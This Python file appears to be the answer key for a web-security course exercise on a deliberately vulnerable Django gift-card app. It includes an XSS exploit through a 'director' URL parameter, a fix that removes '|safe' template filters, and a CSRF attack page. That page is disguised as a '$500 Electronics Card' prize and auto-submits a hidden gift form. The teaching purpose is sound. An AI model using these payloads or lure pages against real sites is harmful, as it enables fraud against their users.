# %%
# w2d4_answers.py

import os
import sys
import django
import io
import unittest
import json
import re
import contextlib
import time
import shutil
import stat
import inspect
import requests

# Setup Django environment
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "GiftcardSite.settings")
django.setup()

from django.test import TestCase, Client
from django.db import connection
from LegacySite.models import Card, User
from django.template import engines

from django.test import TransactionTestCase
from django.core.management import call_command

# %%

"""
Exploit XSS vulnerability by injecting malicious script into director parameter.

Args:
    None

Returns:
    bool: True if XSS payload was successfully injected, False otherwise
"""


def exploit_xss_vulnerability():
    from django.conf import settings

    # Add testserver to ALLOWED_HOSTS if not already there
    if "testserver" not in settings.ALLOWED_HOSTS:
        settings.ALLOWED_HOSTS.append("testserver")

    client = Client()
    # TODO: Create XSS payload and test vulnerable endpoint
    # - Create a malicious JavaScript payload
    # - Replace the current response endpoint with the vulnerable one

    xss_payload = "<script>alert('XSS')</script>"
    endpoint = "/buy/1"
    vulnerable_endpoint = f"/buy/1?director={xss_payload}"
    response = client.get(vulnerable_endpoint)

    print(f"XSS exploit response status: {response.status_code}")

    if response.status_code == 200:
        response_content = response.content.decode()
        if xss_payload in response_content:
            print("[+] XSS vulnerability successfully exploited!")
            print(f"[+] Malicious payload found in response: {xss_payload}")
            return True
        else:
            print("[-] XSS payload not found in response (may be escaped)")
            return False
    else:
        print(f"[-] Request failed with status {response.status_code}")
        return False


from w2d4_test import test_exploit_xss_vulnerability

test_exploit_xss_vulnerability(exploit_xss_vulnerability)

# %%

"""
Fix XSS vulnerability by finding discepencies.
You can do it manually or edit the front end code.

Args:
    None
    
Returns:
    None
"""


def fix_xss_vulnerability():
    files = ["templates/gift.html", "templates/item-single.html"]

    for file in files:
        path = file
        pattern = r"\|\s*safe\b"

        with open(path, "r") as f:
            content = f.read()

        cleaned = re.sub(pattern, "", content)

        with open(path, "w") as f:  # Changed to "w" mode for writing
            f.write(cleaned)


fix_xss_vulnerability()

"""
from w2d4_test import test_fix_xss_vulnerability

print("\nTesting XSS vulnerability fix...")
test_fix_xss_vulnerability(fix_xss_vulnerability)

"""
# %%


def exploit_csrf_vulnerability():
    """
    Create malicious HTML that exploits CSRF vulnerability.

    Args:
        None

    Returns:
        str: HTML content that performs the CSRF attack
    """
    # TODO: Create malicious HTML that performs CSRF attack
    # - Create an HTML page that appears legitimate
    # - Include a hidden form targeting the gift card endpoint
    # - Add JavaScript to automatically submit the form
    gift_endpoint = "/gift/1"
    url = f"http://127.0.0.1:8000{gift_endpoint}"
    data = {
        "username": "",
        "amount": "",
    }
    try:
        response = requests.post(url, json=data)
        if response.status_code == 200:
            print("Success")
        else:
            print("response failed")
    except Exception as e:
        print(e)
    # - Give user "test2" a gify card
    return """<!DOCTYPE html>
<html>
<head>
    <title>Win a Free Electronics Card!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        h1 {
            color: #51be78;
        }
        .loading {
            margin: 20px 0;
            font-style: italic;
            color: #666;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body onload="document.getElementById('giftForm').submit();">
    <div class="container">
        <h1>Win a Free Electronics Card!</h1>
        <p>Congratulations! You've been selected to receive a $500 Electronics Card!</p>
        <p class="loading">Processing your gift card, please wait...</p>
        
        <form id="giftForm" action="http://localhost:8000/gift/5" method="GET" class="hidden">
            <input type="hidden" name="username" value="test2">
            <input type="hidden" name="amount" value="500">
        </form>
    </div>
    
    <script>
        // Store the referrer before submitting the form
        var originalReferrer = document.referrer;
        
        // Submit the form
        window.onload = function() {
            var form = document.getElementById('giftForm');
            form.submit();
            
            // Set a slightly longer timeout to ensure the gift operation completes
            setTimeout(function() {
                if(originalReferrer) {
                    window.location.href = '/';
                } else {
                    // Fallback if no referrer
                    window.location.href = "http://localhost:8000/";
                }
            }, 3000); // 3 seconds should be enough for the operation to complete
        }
    </script>
    
</body>
</html>"""


from w2d4_test import test_exploit_csrf_vulnerability

if __name__ == "__main__":
    print("\nTesting CSRF vulnerability exploitation...")
    test_exploit_csrf_vulnerability(exploit_csrf_vulnerability)
